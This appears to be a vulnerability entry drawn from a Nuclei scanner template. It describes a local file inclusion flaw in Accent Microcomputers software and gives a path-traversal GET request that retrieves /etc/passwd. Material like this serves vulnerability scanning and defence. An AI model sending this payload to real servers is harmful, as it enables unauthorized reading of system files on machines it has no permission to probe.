# Vulnerability: Accent Microcomputers LFI
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`accent-microcomputers-lfi.yaml`)

## Description
A local file inclusion vulnerability in Accent Microcomputers offerings could allow remote attackers to retrieve password files.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php?id=50&file=../../../../../../../../../etc/passwd
```

